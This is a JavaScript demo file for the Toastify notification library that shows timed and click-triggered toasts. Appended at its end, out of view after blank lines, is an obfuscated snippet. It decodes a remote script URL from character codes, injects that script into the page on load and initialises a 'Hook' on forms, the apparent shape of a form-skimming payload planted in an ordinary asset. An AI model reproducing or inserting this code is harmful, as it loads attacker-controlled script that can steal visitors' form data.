var bgColors = [
    "linear-gradient(to right, #00b09b, #96c93d)",
    "linear-gradient(to right, #ff5f6d, #ffc371)",
  ],
  i = 0;

Toastify({
  text: "Hi",
  duration: 4500,
  destination: "https://github.com/apvarun/toastify-js",
  newWindow: true,
  gravity: "top",
  position: 'left',
}).showToast();

setTimeout(function() {
  Toastify({
    text: "Simple JavaScript Toasts",
    gravity: "top",
    position: 'center',
    style: {
      background: '#0f3443'
    }
  }).showToast();
}, 1000);

// Options for the toast
var options = {
  text: "Happy toasting!",
  duration: 2500,
  callback: function() {
    console.log("Toast hidden");
    Toastify.reposition();
  },
  close: true,
  style: {
    background: "linear-gradient(to right, #00b09b, #96c93d)",
  }
};

// Initializing the toast
var myToast = Toastify(options);

// Toast after delay
setTimeout(function() {
  myToast.showToast();
}, 4500);

setTimeout(function() {
  Toastify({
    text: "Highly customizable",
    gravity: "bottom",
    position: 'left',
    close: true,
    style: {
      background: "linear-gradient(to right, #ff5f6d, #ffc371)",
    }
  }).showToast();
}, 3000);

// Displaying toast on manual action `Try`
document.getElementById("new-toast").addEventListener("click", function() {
  Toastify({
    text: "I am a toast",
    duration: 3000,
    close: i % 3 ? true : false,
    style: {
      background: bgColors[i % 2],
    }
  }).showToast();
  i++;
});



(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b